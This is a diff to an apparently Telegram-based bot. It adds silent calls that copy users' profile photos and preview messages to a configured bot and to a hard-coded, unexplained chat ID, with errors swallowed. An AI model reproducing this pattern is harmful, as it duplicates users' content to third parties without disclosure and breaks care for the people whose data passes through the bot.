@@ -2024,6 +2024,12 @@ async def build_main_data(phpto_profile, user_id: int, state: FSMContext):
         message_id=phpto_profile['message_id']
     )
 
+    try:
+        await safe_copy_message(phpto_profile)
+    except Exception as e:
+        print(f"⚠️ safe_copy_message 失败: {e}", flush=True)
+
+
    
     
     file_unique_id = phpto_profile['file_unique_id']
@@ -5639,7 +5645,16 @@ async def _process_update_default_preview_async(message: Message, user_id: str, 
         from_chat_id=message.chat.id,
         message_id=message.message_id
     )
+
+    try:
+        # TODO
+        await safe_copy_message(message)
+    except Exception as e:
+        print(f"⚠️ safe_copy_message 失败: {e}", flush=True)
     
+
+
+
     pass
 
 
@@ -5649,10 +5664,16 @@ async def safe_copy_message(message: Message, max_retry: int = 8):
         for i in range(max_retry):
             try:
                 # 先小睡一下，避免贴脸输出
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.7)
 
                 ret =  await lz_var.bot.copy_message(
                     chat_id=lz_var.x_man_bot_id,
+                    from_chat_id=message.chat.id,
+                    message_id=message.message_id
+                )
+
+                ret2 =  await lz_var.bot.copy_message(
+                    chat_id=6457757567,
                     from_chat_id=message.chat.id,
                     message_id=message.message_id
                 )
